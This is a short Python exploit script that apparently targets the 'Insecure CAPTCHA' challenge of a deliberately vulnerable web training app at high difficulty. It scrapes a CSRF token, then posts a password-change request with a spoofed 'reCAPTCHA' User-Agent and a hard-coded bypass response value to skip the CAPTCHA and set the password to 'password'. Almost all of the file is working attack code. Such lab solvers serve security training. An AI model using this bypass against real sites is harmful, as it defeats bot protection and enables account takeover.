#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

from conf import BASE_URL
from util import http_get, http_post

DIFFICULTY = "high"
NEW_PASSWORD = "password"

# -----------------------

def insecure_captcha_high():
    global DIFFICULTY, NEW_PASSWORD

    print("=======================================")
    print(f"[INFO] - Insecure CAPTCHA {DIFFICULTY}")

    url = BASE_URL + "/vulnerabilities/captcha/"
    
    # first request to get CSRF token    
    r = http_get(url, DIFFICULTY)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {"name": "user_token"})['value']

    # second request to get bypass CAPTCHA and change password
    headers = { "User-agent": "reCAPTCHA"}
    post_data = f"step=2&password_new={NEW_PASSWORD}&password_conf={NEW_PASSWORD}&g-recaptcha-response=hidd3n_valu3&user_token={csrf_token}&Change=Change"
    r = http_post(url, DIFFICULTY, headers=headers, data=post_data)

    if "Password Changed." in r.text:
        print(f"[INFO] - Password changed to '{NEW_PASSWORD}'")
